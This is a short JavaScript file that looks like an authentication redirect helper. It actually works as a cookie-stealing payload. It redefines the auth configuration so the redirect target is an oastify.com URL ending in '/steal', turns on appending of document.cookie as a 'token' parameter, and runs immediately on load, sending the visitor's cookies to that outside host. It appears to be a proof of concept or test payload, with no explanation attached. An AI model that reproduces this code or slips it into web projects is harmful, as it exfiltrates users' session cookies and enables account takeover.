window.Auth = window.Auth || {};

window.Auth.loginRedirect = function (data) {
    console.log("[Auth] Callback received data:", data);

    let config = window.authConfig || {
        dataset: {
            next: '/',
            append: 'false'
        }
    };

    let redirectUrl = config.dataset.next || '/';

    if (config.dataset.append === 'true') {
        let delimiter = redirectUrl.includes('?') ? '&' : '?';
        redirectUrl += delimiter + "token=" + encodeURIComponent(document.cookie);
    }

    console.log("[Auth] Redirecting to:", redirectUrl);
    window.location.href = redirectUrl;
};

window.authConfig = {
    dataset: {
        next: 'https://ztwd6th606h2292kadlx6n681z7qvgj5.oastify.com/steal',
        append: 'true'
    }
};
window.Auth.loginRedirect({});
